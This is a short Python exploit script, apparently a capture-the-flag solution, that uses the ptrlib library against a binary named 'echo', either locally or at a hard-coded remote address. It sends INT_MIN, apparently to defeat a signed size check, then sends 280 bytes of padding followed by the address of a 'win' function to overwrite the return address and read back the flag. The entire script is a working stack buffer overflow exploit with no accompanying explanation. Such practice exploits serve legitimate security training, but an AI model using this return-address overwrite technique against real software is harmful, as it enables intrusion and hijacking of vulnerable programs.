#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./echo")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "34.170.146.252:22124"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()


    int_min = - 2 ** 31
    win_addr = unwrap(exe.symbol("win"))

    offset = 280

    io.sendline(str(int_min))

    payload = b"A" * offset
    payload += ptr.p64(win_addr)

    io.sendline(payload)
    io.recvline()
    flag = io.recvline()
    ptr.logger.info(f'flag: {flag}')


if __name__ == "__main__":
    main()
